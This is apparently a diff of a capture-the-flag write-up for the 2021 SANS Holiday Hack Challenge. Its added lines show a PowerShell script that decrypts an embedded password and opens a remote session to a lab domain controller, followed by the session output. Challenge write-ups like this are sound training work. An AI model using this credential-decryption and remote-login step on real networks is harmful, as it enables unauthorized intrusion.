+$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Negotiate
+```
+
+Running this in `pwsh` gives us a connection to the domain controller:
+```shell
+pqsgdggdkl@grades:~$ pwsh
+PowerShell 7.2.0-rc.1
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+PS /home/pqsgdggdkl> ./dc_logon.ps1
+[10.128.1.53]: PS C:\Users\remote_elf\Documents> ls
+
+
+    Directory: C:\Users\remote_elf\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       12/23/2021  11:23 PM          42180 output.txt
+-a----       12/23/2021  11:15 PM              0 rDACL.ps1
+```
 
 ### 9. Splunk!
 #### Difficulty
@@ -593,6 +1096,7 @@ ip.flags.rb == 1 and http.request.method == POST and http.file_data contains "10
 Investigate [Frost Tower's website for security issues](https://staging.jackfrosttower.com/). This [source code](https://download.holidayhackchallenge.com/2021/frosttower-web.zip) will be useful in your analysis. In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you.
 
 #### Solution
+(Jack's studio)
 
 
 ### 13. FPGA Programming
@@ -603,7 +1107,7 @@ Investigate [Frost Tower's website for security issues](https://staging.jackfros
 Write your first FPGA program to make a doll sing. You might get some suggestions from Grody Goiterson, near Jack's elevator.
 
 #### Solution
-
+(JF Tower roof)
 
 ## Side Quests
 These are completed at Cranberry Pi terminals throughout the game typically next to elves who introduce the task and can provide hints to the main objectives in exchange for helping them with these.
@@ -1041,12 +1545,6 @@ You incorrectly added 0 benign IPs to the naughty list
 * Thank you for all of your help. You are a talented defender!
 *******************************************************************
 ```
-
-# TODO: Remaining Challenges on JF's side
-### Ingreta Tude - Frost Tower Website Checkup
-(Jack's studio) --> this might be objective 12
-
-### Objective 13 is on the roof of the Frost Tower
 
 ### Bonus Challenges - Log4J
 These were added on 12/21/21 at the North Pole location.
